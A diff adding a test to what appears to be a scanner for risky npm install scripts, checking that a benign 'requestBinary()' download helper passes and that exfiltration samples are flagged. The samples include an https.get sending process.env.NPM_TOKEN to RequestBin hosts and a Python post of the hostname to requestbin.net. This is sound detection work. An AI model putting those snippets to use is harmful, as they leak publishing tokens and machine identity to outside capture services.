@@ -118,3 +118,21 @@ test("--deps: a dependency whose main posts to a Slack webhook in its code", () 
     rmSync(out, { recursive: true, force: true });
   }
 });
+
+test("RequestBin by its host names only: requestBinary() is not an address", () => {
+  // chromedriver's and phantomjs-prebuilt's installers define requestBinary()
+  // to download their binaries (Python twin: RequestBinTests)
+  const installer = "const request = require('request');\n"
+    + "function requestBinary(requestOptions, filePath) {\n"
+    + "  return new Promise((resolve) => request(requestOptions).pipe(fs.createWriteStream(filePath)));\n}\n"
+    + "requestBinary(getRequestOptions(), downloadedFile).then(extractDownload);\n";
+  assert.deepEqual(installScriptRisk(installer), []);
+  for (const host of ["requestbin.com", "enx1.x.requestbin.net", "requestbin.io", "requestb.in"]) {
+    const text = `const https = require('https');\nhttps.get('https://${host}/r/abc?d=' + process.env.NPM_TOKEN);\n`;
+    assert.deepEqual(installScriptRisk(text),
+      [`contacts an address typical of data exfiltration (${host.split("x.").pop()})`], host);
+  }
+  const beacon = "import socket, requests\nrequests.post('https://requestbin.net/r/abc', data=socket.gethostname())\n";
+  assert.deepEqual(onImport(beacon, "py"),
+    [["sends the machine's user or host name to a data-capture service (requestbin.net)"], "CRITICAL"]);
+});
